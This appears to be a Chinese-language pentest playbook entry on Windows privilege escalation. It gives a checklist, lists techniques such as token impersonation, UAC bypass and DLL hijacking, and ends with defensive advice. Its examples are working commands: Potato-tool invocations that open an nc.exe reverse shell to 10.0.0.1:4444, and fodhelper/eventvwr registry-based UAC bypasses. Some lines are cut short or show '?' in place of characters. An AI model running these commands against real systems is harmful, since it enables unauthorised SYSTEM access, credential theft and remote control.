# Windows Privilege Escalation Techniques

**ID**: `windows-priv-esc-001` | **分类**: windows | **风险等级**: critical

Windows 权限提升技术用于在获取低权限 shell 后提升到 SYSTEM 或 Administrator 权限。Windows 系统存在多种提权路径：服务配置错误、可写系统路径、令牌操作、UAC 绕过、内核漏洞利用等。提权成功取决于系统配置、权限和补丁级别

## 触发场景

- 获取普通用户权限后需要提升到 SYSTEM ?Administrator
- 发现服务配置权限错误
- 发现可写系统目录或注册表
- 需要绕过 UAC 权限提升
- 发现令牌 (Token) 操作机会

## 操作检查清单

1. 枚举当前用户信息和特权(whoami /all)
2. 检查系统补丁级别(systeminfo)
3. 枚举运行中的服务和权
4. 检查可写系统目录和注册
5. 检查 AlwaysInstallElevated 策略
6. 检查服务路径引号问
7. 检查令牌特
8. 检查 UAC 配置
9. 使用 WinPEAS 等自动化枚举工具

## 技术手段

- 令牌窃取 (Incognito, RoguePotato)
- UAC 绕过 (fodhelper, eventvwr)
- 服务配置滥用
- DLL 劫持
- AlwaysInstallElevated MSI 安装
- 计划任务滥用
- 注册表 Run 键写入
- 内核漏洞利用 (未打补丁)

## 症状

- 当前用户具有 SeImpersonatePrivilege ?SeAssignPrimaryToken
- 系统服务以 SYSTEM 运行但可修改
- 注册表键可写的 AlwaysInstallElevated
- DLL 劫持路径可写
- UAC 未完全启用

## 根因分析

- 服务配置未限制普通用户修改权
- 系统目录权限配置过松
- 用户被授予危险特权(SeImpersonatePrivilege 等
- UAC 配置不完整或可绕
- 未安装最新安全补
- 计划任务权限配置不当

## 示例

### SeImpersonatePrivilege 令牌窃取

利用 SeImpersonatePrivilege 特权进行令牌窃取提权

```
# 使用 RoguePotato ?JuicyPotato
RoguePotato.exe -r 127.0.0.1 -e "C:\Windows\Temp\nc.exe" -l 9001

# 或使用 PrintSpoofer
PrintSpoofer.exe -i -c "C:\Windows\Temp\nc.exe 10.0.0.1 4444 -e cmd.exe"

# 使用 GodPotato (支持多版本
GodPotato-NET4.exe -cmd "C:\Windows\Temp\nc.exe 10.0.0.1 4444 -e cmd.exe"
```

### UAC 绕过

使用已知 UAC 绕过技术提升完整性级

```
# 使用 fodhelper 绕过
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /d "" /f
fodhelper.exe

# 或使用 eventvwr
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d "cmd.exe" /f
eventvwr.exe
```

## 成功标志

- 成功执行 SYSTEM 权限命令
- 可以读取 SAM ?SYSTEM 注册
- 可以创建新用户加入 Administrators

## 防御建议

- 移除不必要的用户特权 (SeImpersonatePrivilege 等
- 启用并强化 UAC (AlwaysNotify)
- 限制服务账户权限
- 修复服务路径引号问题
- 禁用 AlwaysInstallElevated
- 及时安装安全补丁
- 限制普通用户写系统目录
